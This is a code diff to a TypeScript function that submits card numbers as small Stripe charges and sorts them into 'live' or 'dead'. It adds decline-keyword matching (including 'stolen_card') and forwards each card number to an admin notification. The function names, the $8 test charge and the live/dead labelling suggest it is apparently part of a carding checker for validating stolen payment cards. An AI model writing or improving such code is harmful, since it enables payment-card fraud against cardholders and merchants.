@@ -141,18 +141,46 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     // Determine computed status from full_response field
     let computedStatus: "live" | "dead" | "unknown" = "unknown";
     
+    // Primary: Check full_response boolean
     if (typeof fullResponse === 'boolean') {
       computedStatus = fullResponse === true ? "live" : "dead";
     } else if (String(fullResponse).toLowerCase() === 'true') {
       computedStatus = "live";
     } else if (String(fullResponse).toLowerCase() === 'false') {
       computedStatus = "dead";
+    } else {
+      // Fallback: Check message for decline indicators when full_response is missing
+      const messageLower = apiMessage.toLowerCase();
+      if (messageLower.includes('card_declined') || 
+          messageLower.includes('declined') || 
+          messageLower.includes('insufficient') ||
+          messageLower.includes('expired') ||
+          messageLower.includes('invalid') ||
+          messageLower.includes('do_not_honor') ||
+          messageLower.includes('lost_card') ||
+          messageLower.includes('stolen_card')) {
+        computedStatus = "dead";
+      } else if (messageLower.includes('success') || 
+                 messageLower.includes('approved') || 
+                 messageLower.includes('charged')) {
+        computedStatus = "live";
+      }
     }
     
     console.log(`[STRIPE-CHARGE] Computed status: ${computedStatus}`);
 
     // Build display status
     const displayStatus = computedStatus === 'live' ? 'CHARGED' : computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN';
+
+    // Extract clean message for UI display
+    let cleanMessage = apiMessage;
+    // If message contains JSON, try to extract the actual error message
+    if (apiMessage.includes('"message"')) {
+      const msgMatch = apiMessage.match(/"message":\s*"([^"]+)"/);
+      if (msgMatch) {
+        cleanMessage = msgMatch[1];
+      }
+    }
 
     // Send admin debug notification with only captured fields
     sendAdminDebugNotification(cc, displayStatus, { 
@@ -173,10 +201,10 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     return {
       computedStatus,
       apiStatus: displayStatus,
-      apiMessage,
+      apiMessage: cleanMessage,
       apiTotal: '$8.00',
       status: computedStatus,
-      message: apiMessage,
+      message: cleanMessage,
       fullResponse, // Internal/debug only
     };
   } catch (error) {
